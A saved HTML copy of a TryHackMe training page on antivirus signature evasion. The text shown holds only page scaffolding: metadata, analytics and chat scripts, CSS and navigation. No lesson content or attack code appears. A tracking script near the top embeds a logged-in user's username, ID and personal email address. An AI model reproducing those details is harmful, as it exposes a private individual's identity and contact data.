<!DOCTYPE html>
<!-- saved from url=(0043)https://tryhackme.com/room/signatureevasion -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>TryHackMe | Signature Evasion</title>
<meta name="description" content="Learn how to break signatures and evade common AV, using modern tool-agnostic approaches.">
<meta name="og:description" content="Learn how to break signatures and evade common AV, using modern tool-agnostic approaches.">
<meta name="keywords" content="cyber,security,cyber security,cyber security training,coding,computer,bitcoin,hacking,hackers,hacks,hack,exploits,keylogger,learn,poc">


<meta property="og:site_name" content="TryHackMe">
<meta property="og:title" content="TryHackMe | Signature Evasion">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/c729b68475952db950aaaa2b2beeea22.png">
<meta property="og:url" content="https://tryhackme.com/room/signatureevasion">
<meta name="twitter:image" content="https://tryhackme.com/img/meta/default.png">
<meta property="og:description" content="Learn how to break signatures and evade common AV, using modern tool-agnostic approaches.">

<script type="text/javascript" async="" src="./TryHackMe _ Signature Evasion_files/pgpbhph6"></script><script src="./TryHackMe _ Signature Evasion_files/jquery.min.js"></script>
<script src="./TryHackMe _ Signature Evasion_files/popper.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Signature Evasion_files/boostrap431.min.css">
<script src="./TryHackMe _ Signature Evasion_files/bootstrap431.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Signature Evasion_files/animate.min.css">
<link rel="stylesheet" href="./TryHackMe _ Signature Evasion_files/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
<link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png">
<link rel="stylesheet" media="screen" href="./TryHackMe _ Signature Evasion_files/general-style.css">
<script src="./TryHackMe _ Signature Evasion_files/script.js"></script>
<script src="./TryHackMe _ Signature Evasion_files/validation.js"></script>

<link rel="stylesheet" type="text/css" href="./TryHackMe _ Signature Evasion_files/cookieconsent.min.css">
<script src="./TryHackMe _ Signature Evasion_files/cookieconsent.min.js"></script>
<script async="" src="./TryHackMe _ Signature Evasion_files/js"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
  
    gtag('config', 'G-Z8D4WL3D4P');
  </script>


<script>
    window.intercomSettings = {
      api_base: "https://api-iam.intercom.io",
      app_id: "pgpbhph6"
    };
  </script>
<script>
    (function (h, o, t, j, a, r) {
      h.hj = h.hj || function () { (h.hj.q = h.hj.q || []).push(arguments) };
      h._hjSettings = { hjid: 1950941, hjsv: 6 };
      a = o.getElementsByTagName('head')[0];
      r = o.createElement('script'); r.async = 1;
      r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
      a.appendChild(r);
    })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
  </script><script async="" src="./TryHackMe _ Signature Evasion_files/hotjar-1950941.js"></script>
<script>
    /* Global javascript variables */

    // Used inside script.js for createRooms compelted users.
    const username = 'Silv3rsurf3r'
    const subscribed = '1'
    const level = '10'
    const intercomEnabled = 'true'
  </script>
<script>
    //add back tracking info
    const userId = "63d14e7f857ae10041bb192f"
    let tutorialComplete = false
    if ('false' == "true") {
      tutorialComplete = true
    }
    if(intercomEnabled === "true"){
      window.intercomSettings = {
        api_base: "https://api-iam.intercom.io",
        app_id: "pgpbhph6",
        user_id: userId,
        username: username,
        email: "giftonpaul@karunya.edu.in",
        created_at: Math.floor(new Date("Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)").getTime() / 1000) // Signup date as a Unix timestamp
      };
    }
    window.hj('identify', userId, {
      displayName: username,
      subscribed: "1",
      dateSignUp: "Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)",
      experience: "advanced"
    })
  </script>
<script type="application/ld+json">

   {
      "@context":"https://schema.org",
      "@type":"Organization",
      "url":"https://tryhackme.com",
      "name":"TryHackMe",
      "logo":"https://tryhackme.com/img/favicon.png",
      "description":"TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!",
      "email": "support@tryhackme.com",
      "sameAs":[
         "https://www.linkedin.com/company/tryhackme",
         "https://twitter.com/realtryhackme"
      ]
   }

</script>
<script>
    console.log(`%c
      ------------------
      < Happy Hacking! >
      ------------------
              \\   ^__^
               \\  (oo)\\_______
                  (__)\\       )\\/\\
                      ||----w |
                      ||     ||`, "font-family:monospace")
  </script>
<script>
  (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/pgpbhph6';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(document.readyState==='complete'){l();}else if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
</script>
<script src="./TryHackMe _ Signature Evasion_files/socket.io.js"></script><script async="" src="./TryHackMe _ Signature Evasion_files/modules.5957fbf26d1b525b5a12.js" charset="utf-8"></script><script>
  let socket = io.connect({
    transports: ['websocket'],
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionAttempts: 10
  })
</script><style type="text/css">.apexcharts-canvas {
  position: relative;
  user-select: none;
  /* cannot give overflow: hidden as it will crop tooltips which overflow outside chart area */
}


/* scrollbar is not visible by default for legend, hence forcing the visibility */
.apexcharts-canvas ::-webkit-scrollbar {
  -webkit-appearance: none;
  width: 6px;
}

.apexcharts-canvas ::-webkit-scrollbar-thumb {
  border-radius: 4px;
  background-color: rgba(0, 0, 0, .5);
  box-shadow: 0 0 1px rgba(255, 255, 255, .5);
  -webkit-box-shadow: 0 0 1px rgba(255, 255, 255, .5);
}


.apexcharts-inner {
  position: relative;
}

.apexcharts-text tspan {
  font-family: inherit;
}

.legend-mouseover-inactive {
  transition: 0.15s ease all;
  opacity: 0.20;
}

.apexcharts-series-collapsed {
  opacity: 0;
}

.apexcharts-tooltip {
  border-radius: 5px;
  box-shadow: 2px 2px 6px -4px #999;
  cursor: default;
  font-size: 14px;
  left: 62px;
  opacity: 0;
  pointer-events: none;
  position: absolute;
  top: 20px;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  white-space: nowrap;
  z-index: 12;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-theme-light {
  border: 1px solid #e3e3e3;
  background: rgba(255, 255, 255, 0.96);
}

.apexcharts-tooltip.apexcharts-theme-dark {
  color: #fff;
  background: rgba(30, 30, 30, 0.8);
}

.apexcharts-tooltip * {
  font-family: inherit;
}


.apexcharts-tooltip-title {
  padding: 6px;
  font-size: 15px;
  margin-bottom: 4px;
}

.apexcharts-tooltip.apexcharts-theme-light .apexcharts-tooltip-title {
  background: #ECEFF1;
  border-bottom: 1px solid #ddd;
}

.apexcharts-tooltip.apexcharts-theme-dark .apexcharts-tooltip-title {
  background: rgba(0, 0, 0, 0.7);
  border-bottom: 1px solid #333;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  display: inline-block;
  font-weight: 600;
  margin-left: 5px;
}

.apexcharts-tooltip-text-y-label:empty,
.apexcharts-tooltip-text-y-value:empty,
.apexcharts-tooltip-text-goals-label:empty,
.apexcharts-tooltip-text-goals-value:empty,
.apexcharts-tooltip-text-z-value:empty {
  display: none;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  font-weight: 600;
}

.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-goals-group, 
.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  display: flex;
}
.apexcharts-tooltip-text-goals-label:not(:empty),
.apexcharts-tooltip-text-goals-value:not(:empty) {
  margin-top: -6px;
}

.apexcharts-tooltip-marker {
  width: 12px;
  height: 12px;
  position: relative;
  top: 0px;
  margin-right: 10px;
  border-radius: 50%;
}

.apexcharts-tooltip-series-group {
  padding: 0 10px;
  display: none;
  text-align: left;
  justify-content: left;
  align-items: center;
}

.apexcharts-tooltip-series-group.apexcharts-active .apexcharts-tooltip-marker {
  opacity: 1;
}

.apexcharts-tooltip-series-group.apexcharts-active,
.apexcharts-tooltip-series-group:last-child {
  padding-bottom: 4px;
}

.apexcharts-tooltip-series-group-hidden {
  opacity: 0;
  height: 0;
  line-height: 0;
  padding: 0 !important;
}

.apexcharts-tooltip-y-group {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-box, .apexcharts-custom-tooltip {
  padding: 4px 8px;
}

.apexcharts-tooltip-boxPlot {
  display: flex;
  flex-direction: column-reverse;
}

.apexcharts-tooltip-box>div {
  margin: 4px 0;
}

.apexcharts-tooltip-box span.value {
  font-weight: bold;
}

.apexcharts-tooltip-rangebar {
  padding: 5px 8px;
}

.apexcharts-tooltip-rangebar .category {
  font-weight: 600;
  color: #777;
}

.apexcharts-tooltip-rangebar .series-name {
  font-weight: bold;
  display: block;
  margin-bottom: 5px;
}

.apexcharts-xaxistooltip {
  opacity: 0;
  padding: 9px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
  transition: 0.15s ease all;
}

.apexcharts-xaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-xaxistooltip:after,
.apexcharts-xaxistooltip:before {
  left: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-xaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-left: -6px;
}

.apexcharts-xaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-left: -7px;
}

.apexcharts-xaxistooltip-bottom:after,
.apexcharts-xaxistooltip-bottom:before {
  bottom: 100%;
}

.apexcharts-xaxistooltip-top:after,
.apexcharts-xaxistooltip-top:before {
  top: 100%;
}

.apexcharts-xaxistooltip-bottom:after {
  border-bottom-color: #ECEFF1;
}

.apexcharts-xaxistooltip-bottom:before {
  border-bottom-color: #90A4AE;
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:after {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:before {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top:after {
  border-top-color: #ECEFF1
}

.apexcharts-xaxistooltip-top:before {
  border-top-color: #90A4AE;
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:after {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:before {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-yaxistooltip {
  opacity: 0;
  padding: 4px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
}

.apexcharts-yaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-yaxistooltip:after,
.apexcharts-yaxistooltip:before {
  top: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-yaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-top: -6px;
}

.apexcharts-yaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-top: -7px;
}

.apexcharts-yaxistooltip-left:after,
.apexcharts-yaxistooltip-left:before {
  left: 100%;
}

.apexcharts-yaxistooltip-right:after,
.apexcharts-yaxistooltip-right:before {
  right: 100%;
}

.apexcharts-yaxistooltip-left:after {
  border-left-color: #ECEFF1;
}

.apexcharts-yaxistooltip-left:before {
  border-left-color: #90A4AE;
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:after {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:before {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right:after {
  border-right-color: #ECEFF1;
}

.apexcharts-yaxistooltip-right:before {
  border-right-color: #90A4AE;
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:after {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:before {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip.apexcharts-active {
  opacity: 1;
}

.apexcharts-yaxistooltip-hidden {
  display: none;
}

.apexcharts-xcrosshairs,
.apexcharts-ycrosshairs {
  pointer-events: none;
  opacity: 0;
  transition: 0.15s ease all;
}

.apexcharts-xcrosshairs.apexcharts-active,
.apexcharts-ycrosshairs.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-ycrosshairs-hidden {
  opacity: 0;
}

.apexcharts-selection-rect {
  cursor: move;
}

.svg_select_boundingRect, .svg_select_points_rot {
  pointer-events: none;
  opacity: 0;
  visibility: hidden;
}
.apexcharts-selection-rect + g .svg_select_boundingRect,
.apexcharts-selection-rect + g .svg_select_points_rot {
  opacity: 0;
  visibility: hidden;
}

.apexcharts-selection-rect + g .svg_select_points_l,
.apexcharts-selection-rect + g .svg_select_points_r {
  cursor: ew-resize;
  opacity: 1;
  visibility: visible;
}

.svg_select_points {
  fill: #efefef;
  stroke: #333;
  rx: 2;
}

.apexcharts-svg.apexcharts-zoomable.hovering-zoom {
  cursor: crosshair
}

.apexcharts-svg.apexcharts-zoomable.hovering-pan {
  cursor: move
}

.apexcharts-zoom-icon,
.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon,
.apexcharts-reset-icon,
.apexcharts-pan-icon,
.apexcharts-selection-icon,
.apexcharts-menu-icon,
.apexcharts-toolbar-custom-icon {
  cursor: pointer;
  width: 20px;
  height: 20px;
  line-height: 24px;
  color: #6E8192;
  text-align: center;
}

.apexcharts-zoom-icon svg,
.apexcharts-zoomin-icon svg,
.apexcharts-zoomout-icon svg,
.apexcharts-reset-icon svg,
.apexcharts-menu-icon svg {
  fill: #6E8192;
}

.apexcharts-selection-icon svg {
  fill: #444;
  transform: scale(0.76)
}

.apexcharts-theme-dark .apexcharts-zoom-icon svg,
.apexcharts-theme-dark .apexcharts-zoomin-icon svg,
.apexcharts-theme-dark .apexcharts-zoomout-icon svg,
.apexcharts-theme-dark .apexcharts-reset-icon svg,
.apexcharts-theme-dark .apexcharts-pan-icon svg,
.apexcharts-theme-dark .apexcharts-selection-icon svg,
.apexcharts-theme-dark .apexcharts-menu-icon svg,
.apexcharts-theme-dark .apexcharts-toolbar-custom-icon svg {
  fill: #f3f4f5;
}

.apexcharts-canvas .apexcharts-zoom-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-selection-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-reset-zoom-icon.apexcharts-selected svg {
  fill: #008FFB;
}

.apexcharts-theme-light .apexcharts-selection-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoom-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoomin-icon:hover svg,
.apexcharts-theme-light .apexcharts-zoomout-icon:hover svg,
.apexcharts-theme-light .apexcharts-reset-icon:hover svg,
.apexcharts-theme-light .apexcharts-menu-icon:hover svg {
  fill: #333;
}

.apexcharts-selection-icon,
.apexcharts-menu-icon {
  position: relative;
}

.apexcharts-reset-icon {
  margin-left: 5px;
}

.apexcharts-zoom-icon,
.apexcharts-reset-icon,
.apexcharts-menu-icon {
  transform: scale(0.85);
}

.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon {
  transform: scale(0.7)
}

.apexcharts-zoomout-icon {
  margin-right: 3px;
}

.apexcharts-pan-icon {
  transform: scale(0.62);
  position: relative;
  left: 1px;
  top: 0px;
}

.apexcharts-pan-icon svg {
  fill: #fff;
  stroke: #6E8192;
  stroke-width: 2;
}

.apexcharts-pan-icon.apexcharts-selected svg {
  stroke: #008FFB;
}

.apexcharts-pan-icon:not(.apexcharts-selected):hover svg {
  stroke: #333;
}

.apexcharts-toolbar {
  position: absolute;
  z-index: 11;
  max-width: 176px;
  text-align: right;
  border-radius: 3px;
  padding: 0px 6px 2px 6px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.apexcharts-menu {
  background: #fff;
  position: absolute;
  top: 100%;
  border: 1px solid #ddd;
  border-radius: 3px;
  padding: 3px;
  right: 10px;
  opacity: 0;
  min-width: 110px;
  transition: 0.15s ease all;
  pointer-events: none;
}

.apexcharts-menu.apexcharts-menu-open {
  opacity: 1;
  pointer-events: all;
  transition: 0.15s ease all;
}

.apexcharts-menu-item {
  padding: 6px 7px;
  font-size: 12px;
  cursor: pointer;
}

.apexcharts-theme-light .apexcharts-menu-item:hover {
  background: #eee;
}

.apexcharts-theme-dark .apexcharts-menu {
  background: rgba(0, 0, 0, 0.7);
  color: #fff;
}

@media screen and (min-width: 768px) {
  .apexcharts-canvas:hover .apexcharts-toolbar {
    opacity: 1;
  }
}

.apexcharts-datalabel.apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-pie-label,
.apexcharts-datalabels,
.apexcharts-datalabel,
.apexcharts-datalabel-label,
.apexcharts-datalabel-value {
  cursor: default;
  pointer-events: none;
}

.apexcharts-pie-label-delay {
  opacity: 0;
  animation-name: opaque;
  animation-duration: 0.3s;
  animation-fill-mode: forwards;
  animation-timing-function: ease;
}

.apexcharts-canvas .apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-hide .apexcharts-series-points {
  opacity: 0;
}

.apexcharts-gridline,
.apexcharts-annotation-rect,
.apexcharts-tooltip .apexcharts-marker,
.apexcharts-area-series .apexcharts-area,
.apexcharts-line,
.apexcharts-zoom-rect,
.apexcharts-toolbar svg,
.apexcharts-area-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-line-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-radar-series path,
.apexcharts-radar-series polygon {
  pointer-events: none;
}


/* markers */

.apexcharts-marker {
  transition: 0.15s ease all;
}

@keyframes opaque {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}


/* Resize generated styles */

@keyframes resizeanim {
  from {
    opacity: 0;
  }
  to {
    opacity: 0;
  }
}

.resize-triggers {
  animation: 1ms resizeanim;
  visibility: hidden;
  opacity: 0;
}

.resize-triggers,
.resize-triggers>div,
.contract-trigger:before {
  content: " ";
  display: block;
  position: absolute;
  top: 0;
  left: 0;
  height: 100%;
  width: 100%;
  overflow: hidden;
}

.resize-triggers>div {
  background: #eee;
  overflow: auto;
}

.contract-trigger:before {
  width: 200%;
  height: 200%;
}</style><style data-jss="" data-meta="MuiDialog">
@media print {
  .MuiDialog-root {
    position: absolute !important;
  }
}
.MuiDialog-scrollPaper {
  display: flex;
  align-items: center;
  justify-content: center;
}
.MuiDialog-scrollBody {
  overflow-x: hidden;
  overflow-y: auto;
  text-align: center;
}
.MuiDialog-scrollBody:after {
  width: 0;
  height: 100%;
  content: "";
  display: inline-block;
  vertical-align: middle;
}
.MuiDialog-container {
  height: 100%;
  outline: 0;
}
@media print {
  .MuiDialog-container {
    height: auto;
  }
}
.MuiDialog-paper {
  margin: 32px;
  position: relative;
  overflow-y: auto;
}
@media print {
  .MuiDialog-paper {
    box-shadow: none;
    overflow-y: visible;
  }
}
.MuiDialog-paperScrollPaper {
  display: flex;
  max-height: calc(100% - 64px);
  flex-direction: column;
}
.MuiDialog-paperScrollBody {
  display: inline-block;
  text-align: left;
  vertical-align: middle;
}
.MuiDialog-paperWidthFalse {
  max-width: calc(100% - 64px);
}
.MuiDialog-paperWidthXs {
  max-width: 444px;
}
@media (max-width:507.95px) {
  .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthSm {
  max-width: 600px;
}
@media (max-width:663.95px) {
  .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthMd {
  max-width: 960px;
}
@media (max-width:1023.95px) {
  .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthLg {
  max-width: 1280px;
}
@media (max-width:1343.95px) {
  .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthXl {
  max-width: 1920px;
}
@media (max-width:1983.95px) {
  .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperFullWidth {
  width: calc(100% - 64px);
}
.MuiDialog-paperFullScreen {
  width: 100%;
  height: 100%;
  margin: 0;
  max-width: 100%;
  max-height: none;
  border-radius: 0;
}
.MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
  margin: 0;
  max-width: 100%;
}
</style><style></style><meta name="viewport" content="width=device-width, initial-scale=1"></head>


<body><div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override-382972913 cc-invisible hidden-originally" style="display: none;" data-pf_style_display="none" data-pf_style_visibility="visible"><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">We use cookies to ensure you get the best user experience. For more information contact us. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link hidden-originally" href="https://tryhackme.com/legal/terms-of-use" target="_blank" data-pf_style_display="none" data-pf_style_visibility="hidden">Read more</a></span><div class="cc-compliance hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><a aria-label="dismiss cookie message" role="button" tabindex="0" class="cc-btn cc-dismiss hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Got it!</a></div><!--googleon: all--></div>
<link href="./TryHackMe _ Signature Evasion_files/scoreboard.css" rel="stylesheet" type="text/css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<link href="./TryHackMe _ Signature Evasion_files/introjs.css" rel="stylesheet" type="text/css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<link href="./TryHackMe _ Signature Evasion_files/slideout.css" rel="stylesheet" type="text/css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<link href="./TryHackMe _ Signature Evasion_files/public-rooms.css" rel="stylesheet" type="text/css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<link href="./TryHackMe _ Signature Evasion_files/asciinema-player.css" rel="stylesheet" type="text/css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"> 
<link href="./TryHackMe _ Signature Evasion_files/prism.css" rel="stylesheet" type="text/css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"> 
<link href="./TryHackMe _ Signature Evasion_files/magnific-popup.css" rel="stylesheet" type="text/css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"> 
<script src="./TryHackMe _ Signature Evasion_files/lottie-player.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>

<div id="room-content" data-pf_style_display="block" data-pf_style_visibility="visible">
<div id="room-content-main" data-pf_style_display="block" data-pf_style_visibility="visible">
<nav class="navbar navbar-expand-md navbar-dark navbar-color-loggedin navbar-main" data-pf_style_display="flex" data-pf_style_visibility="visible">
<div class="container" data-pf_style_display="flex" data-pf_style_visibility="visible">
<button id="thm-mobile-nav-open" class="thm-nav__hamburger-btn hidden-originally" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Open mobile navigation" data-pf_style_display="none" data-pf_style_visibility="visible">
<span class="thm-nav__hamburger-lines hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></span>
</button>
<div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent" data-pf_style_display="flex" data-pf_style_visibility="visible">
<div class="navbar-brand" href="/" data-pf_style_display="block" data-pf_style_visibility="visible">
<a href="https://tryhackme.com/dashboard" data-pf_style_display="inline" data-pf_style_visibility="visible">
<img width="115px" src="./TryHackMe _ Signature Evasion_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="115" data-pf_rect_height="64.65625">
</a>
</div>
<ul class="navbar-nav mr-auto mt-2 mt-lg-0 navbar-pagelinks" data-pf_style_display="flex" data-pf_style_visibility="visible">
<li class="nav-item " data-pf_style_display="list-item" data-pf_style_visibility="visible">
<a class="nav-link" href="https://tryhackme.com/dashboard" data-pf_style_display="block" data-pf_style_visibility="visible">
<i class="navbar-item-icon far fa-browser" data-pf_style_display="block" data-pf_style_visibility="visible"></i>
<div class="navbar-item-text" data-pf_style_display="block" data-pf_style_visibility="visible">Dashboard</div>
</a>
</li>
<li class="nav-item active" id="nav-learn" data-pf_style_display="list-item" data-pf_style_visibility="visible">
<a class="nav-link" href="https://tryhackme.com/hacktivities" data-pf_style_display="block" data-pf_style_visibility="visible">
<i class="navbar-item-icon far fa-book-open" data-pf_style_display="block" data-pf_style_visibility="visible"></i>
<div class="navbar-item-text" data-pf_style_display="block" data-pf_style_visibility="visible">Learn</div>
</a>
</li>
<li class="nav-item  dropdown lite-removable" data-pf_style_display="list-item" data-pf_style_visibility="visible">
<a id="nav-other" class="nav-link" href="https://tryhackme.com/room/signatureevasion#" data-toggle="dropdown" data-pf_style_display="block" data-pf_style_visibility="visible">
<i class="navbar-item-icon far fa-trophy" data-pf_style_display="block" data-pf_style_visibility="visible"></i>
<div class="navbar-item-text" data-pf_style_display="block" data-pf_style_visibility="visible">Compete</div>
</a>
<div class="dropdown-menu hidden-originally" aria-labelledby="navbarDropdown" data-pf_style_display="none" data-pf_style_visibility="visible">
<a class="dropdown-item d-flex vertical-align-custom hidden-originally" href="https://tryhackme.com/leaderboards" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="dropdown-menu-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fas fa-trophy hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<div class="dropdown-menu-desc hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Leaderboards</span>
<div class="text-lgray size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Platform Rankings</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom hidden-originally" href="https://tryhackme.com/games/koth" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="dropdown-menu-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fas fa-crown hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<div class="dropdown-menu-desc hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">King of the Hill</span>
<div class="text-lgray size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Attack &amp; Defend</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom hidden-originally" href="https://tryhackme.com/workspace" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="dropdown-menu-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fas fa-user-friends hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<div class="dropdown-menu-desc hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Workspace</span>
<div class="text-lgray size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item dropdown" data-pf_style_display="list-item" data-pf_style_visibility="visible">
<a data-cy="nav-other-menu-button" id="nav-other" class="nav-link" href="https://tryhackme.com/room/signatureevasion#" data-toggle="dropdown" data-pf_style_display="block" data-pf_style_visibility="visible">
<i class="navbar-item-icon far fa-ellipsis-h-alt" data-pf_style_display="block" data-pf_style_visibility="visible"></i>
<div class="navbar-item-text" data-pf_style_display="block" data-pf_style_visibility="visible">Other</div>
</a>
<div data-cy="nav-other-menu" class="dropdown-menu dropdown-menu-center large-dropdown hidden-originally" aria-labelledby="navbarDropdown" data-pf_style_display="none" data-pf_style_visibility="visible">
<span class="dropdown-menu-arrow hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></span>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/resources" data-pf_style_display="none" data-pf_style_visibility="hidden">Resources</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/subscriptions" data-pf_style_display="none" data-pf_style_visibility="hidden">Buy Vouchers</a>
